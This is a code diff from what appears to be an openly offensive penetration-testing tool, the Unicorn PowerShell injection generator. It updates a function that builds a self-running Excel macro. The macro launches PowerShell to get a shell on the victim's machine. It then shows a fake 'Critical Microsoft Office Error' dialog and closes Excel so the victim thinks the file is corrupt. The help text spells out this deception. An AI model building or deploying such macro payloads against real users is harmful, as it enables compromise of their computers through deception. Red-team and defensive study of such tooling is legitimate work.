@@ -94,7 +94,7 @@ def macro_help():
 				-----MACRO ATTACK INSTRUCTIONS----
 
 For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do
-that, you will have a developer tab. Create a new macro, call it AutoOpen and paste the generated code
+that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code
 into that. This will automatically run. Note that a message will prompt to the user saying that the file
 is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the
 victim to thinking the excel document is corrupted. You should get a shell through powershell injection
@@ -195,7 +195,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v2.4.2 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v2.4.3 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -228,7 +228,7 @@ def write_file(path, text):
 # generate full macro
 def generate_macro(full_attack, line_length=380):
     # start of the macro
-    macro_str = "Sub AutoOpen()\nDim x\nx = "
+    macro_str = "Sub Auto_Open()\nDim x\nx = "
 
     if line_length is None:
         line_length_int = 380
@@ -244,14 +244,15 @@ def generate_macro(full_attack, line_length=380):
     macro_str = macro_str[:-4]
     # remove first occurrence of &
     macro_str = macro_str.replace("& ", "", 1)
-    macro_str = macro_str.replace("powershell -window", "-window")
+    macro_str = macro_str.replace('powershell -w 1 -C "', r'powershell -w 1 -noprofile -C \""')
+    macro_str = macro_str.replace(''''"''', r''''\""''')
 
     # end of macro
     macro_str += """"\nShell ("powershell.exe " & x)\nDim title As String\ntitle = "Critical Microsoft Office Error"\nDim msg As String\nDim intResponse As Integer\nmsg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub"""
     return macro_str
 
 
-# generate Matthew Graeber's (Matt rocks) attack for binary to cert format
+# generate Matthew Graeber's (Matt rocks) attack for binary to cert format #KeepMattHappy
 # - https://gist.github.com/mattifestation/47f9e8a431f96a266522
 def gen_cert_attack(filename):
     if os.path.isfile(filename):
